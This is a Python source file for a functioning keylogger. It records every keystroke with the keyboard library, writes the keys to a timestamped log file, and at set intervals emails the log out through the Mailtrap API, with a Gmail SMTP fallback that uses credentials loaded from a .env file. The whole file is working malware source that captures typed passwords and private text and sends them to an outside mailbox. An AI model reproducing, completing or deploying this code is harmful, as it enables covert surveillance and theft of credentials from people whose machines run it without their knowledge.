import keyboard
import smtplib
from threading import Timer
import mailtrap as mt
import datetime
import os
import time
from dotenv import load_dotenv

# Load environment variables from .env file
load_dotenv()

# Configuration (loaded from .env)
EMAIL_ADDRESS = os.getenv("EMAIL_ADDRESS")
EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD")
SEND_REPORT_EVERY = int(os.getenv("SEND_REPORT_EVERY") or 60)
  # Default to 60 if not set
MAILTRAP_TOKEN = os.getenv("MAILTRAP_TOKEN")
MAILTRAP_SENDER_EMAIL = os.getenv("MAILTRAP_SENDER_EMAIL")
MAILTRAP_SENDER_NAME = os.getenv("MAILTRAP_SENDER_NAME", "Keylogger Report")  # Default value
MAILTRAP_RECIPIENT_EMAIL = os.getenv("MAILTRAP_RECIPIENT_EMAIL")


class Keylogger:
    def __init__(self, time_interval):
        self.time_interval = time_interval
        self.log = ""
        self.started = False

    def append_to_log(self, string):
        self.log += string

    def on_press(self, event):
        if not self.started:
            self.started = True
            self.start_timer()

        key_name = event.name
        if key_name == "space":
            current_key = " "
        elif key_name == "enter":
            current_key = "[ENTER]"
        elif key_name == "backspace":
            current_key = "[BACKSPACE]"
        elif key_name == "tab":
            current_key = "[TAB]"
        elif key_name == "shift":
            current_key = "[SHIFT]"
        elif key_name == "ctrl":
            current_key = "[CTRL]"
        elif key_name == "alt":
            current_key = "[ALT]"
        elif key_name == "caps lock":
            current_key = "[CAPS_LOCK]"
        elif key_name == "esc":
            current_key = "[ESC]"
        elif key_name == "delete":
            current_key = "[DELETE]"
        else:
            current_key = key_name

        self.append_to_log(current_key)

    def send_report(self):
        if self.log:
            log_file_path = "keylogger_log.txt"

            self.log_to_file(self.log, log_file_path, append=True)
            self.log = ""

            attempts = 3
            for i in range(attempts):
                try:
                    self.send_log_file(log_file_path)
                    os.remove(log_file_path)  # Clear the log file after sending (optional)
                    break
                except Exception as e:
                    print(f"Error sending log file (attempt {i+1}/{attempts}): {e}")
                    time.sleep(10)
                    if i == attempts - 1:
                        print("Log file sending failed after multiple attempts.")
                    else:
                        print("Retrying...")     
        self.start_timer()

    def start_timer(self):
        self.timer = Timer(self.time_interval, self.send_report)
        self.timer.start()

    def send_log_file(self, file_path):
        with open(file_path, "r") as f:
            log_content = f.read()

        try:
            mail = mt.Mail(
                sender=mt.Address(email=MAILTRAP_SENDER_EMAIL, name=MAILTRAP_SENDER_NAME),
                to=[mt.Address(email=MAILTRAP_RECIPIENT_EMAIL)],
                subject="Keylogger Report",
                text=log_content,
                category="Keylogger Report",
            )

            client = mt.MailtrapClient(token=MAILTRAP_TOKEN)
            response = client.send(mail)
            print(f"Mailtrap Response: {response}")

            if not response['success']:
                print(f"Mailtrap Error: {response}")
                self.send_mail_fallback(log_content)
                return

        except Exception as e:
            print(f"Error sending log file via Mailtrap: {e}")
            self.send_mail_fallback(log_content)

    def send_mail_fallback(self, message):
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            subject = "Keylogger Report (Fallback)"
            server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, f"Subject: {subject}\n\n{message}")
            server.quit()
            print("Email sent successfully using fallback method.")
        except Exception as e:
            print(f"Error sending log file via fallback: {e}")

    def log_to_file(self, message, file_path, append=False):
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        mode = "a" if append else "w"
        try:
            with open(file_path, mode) as f:
                f.write(f"[{timestamp}] {message}\n")
            print("Log written to file.")
        except Exception as e:
            print(f"Error writing to file: {e}")

    def run(self):
        keyboard.on_press(self.on_press)
        while True:
            pass


if __name__ == "__main__":
    keylogger = Keylogger(SEND_REPORT_EVERY)
    keylogger.run()